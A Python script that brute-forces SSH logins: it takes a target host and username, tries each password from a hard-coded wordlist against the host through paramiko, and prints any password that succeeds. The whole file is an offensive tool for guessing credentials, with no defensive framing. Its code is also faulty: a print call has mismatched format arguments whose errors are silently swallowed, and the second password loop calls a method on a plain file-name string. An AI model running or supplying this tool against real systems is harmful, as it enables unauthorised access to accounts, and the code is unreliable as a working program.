#!/usr/bin/env python3.7

import paramiko, sys, os, socket

global host, username, line, mostcommon, inputfile

line = "\n - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n"

def attack_ssh(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy (paramiko.AutoAddPolicy())
	
	try:
		ssh.connect(host, port=22,username = username,password = password)
	except paramiko.AuthenticationException:
		#[*] Authentication Failed ...
		code = 1
	except socket.error:
		#[*] Connection Failed ... Host Down
		code = 2
		
	ssh.close()
	
	return code


try: 
	host = input("[*] Enter Target Host Address: ")
	username = input("[*] Enter SSH Username: ")
	mostcommon = open('/Users/boltzmann/github/passwords.txt', 'r')
	mostcommon_size = os.path.getsize('/Users/boltzmann/github/passwords.txt')
	
	if mostcommon_size == 0:
		print("\n[*] Size of the current passworld file is: %s" %(mostcommon_size))
	inputfile = input("[*] Enter SSH Password File: ")
	
	if os.path.exists(inputfile) == False:
		print("\n[*] There is no Input file for the password. This will now exit. ")
		sys.exit(4)
			
except KeyboardInterrupt:
	print("\n\n[*] User Requested an Interrupt. Bye Bye - Hal ")
	sys.exit(3)
			
print("")
for i in mostcommon.readlines():
	password=i.strip("\n")
	try:
		response = attack_ssh(password)
		if response == 0:
			print("%s[*] User: %s [*] Password Found: %s%s" %(line, username, password, line))
			sys.exit(0)
		
		elif response == 1:
			print("%s[*] User: %s [*] Password: %s Not Found, the login attempt is incorrect! =" %(username, password))
		
		elif response == 2:
			print("[*] Connect Could not be established to address: %s" %(host))
			sys.exit(2)
			
	except Exception:
		pass
		
mostcommon.close()

for i in inputfile.readLines():
	password=i.strip("\n")
	try:
		response = attack_ssh(password)
		if response == 0:
			print("%s[*] User: %s [*] Password Found: %s%s" %(line, username, password, line))
			sys.exit(0)
		elif response == 1:
			print("%s[*] User: %s [*] Password: %s Not Found, the login attempt is incorrect! =" %(username, password))
		elif response == 2:
			print("[*] Connect Could not be established to address: %s" %(host))
			sys.exit(2)
	
	except Exception:
		pass
		
inputfile.close()
		
		
	
		
		
		
	
